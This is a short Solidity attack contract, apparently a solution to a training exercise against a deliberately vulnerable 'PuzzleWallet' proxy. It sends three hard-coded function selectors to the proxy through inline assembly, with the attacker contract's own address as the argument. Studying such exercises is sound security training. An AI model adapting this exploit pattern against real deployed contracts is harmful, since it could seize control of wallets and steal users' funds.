pragma solidity ^0.8.0;

import "../../../Exercise/Stage3/24/PuzzleWallet.sol";

contract AttackPuzzelWallet {
    PuzzleProxy puzzleProxyAddress;

    constructor(address payable _puzzleProxyAddress){
        puzzleProxyAddress = PuzzleProxy(_puzzleProxyAddress);
    }

    function attack1()  public payable {
        doCall(0xa6376746,  address(this));
    }

    function attack2()  public payable {
        doCall(0xe43252d7,  address(this));
    }

    function attack3()  public payable {
        doCall(0x9d51d9b7, address(this));
    }

    function doCall(bytes4 sig, address data) private {
        assembly {
            mstore(0x60, sig)
            mstore(0x64, data)
            let contractAddress := sload(puzzleProxyAddress.slot)
            let result := call(gas(), contractAddress,0, 0x60, 0x24, 0, 0)
            let size := returndatasize()
            returndatacopy(0x60, 0, size)
            switch result
            case 0 {revert(0x60, size)}
            default {return (0x60, size)}
        }
    }
}
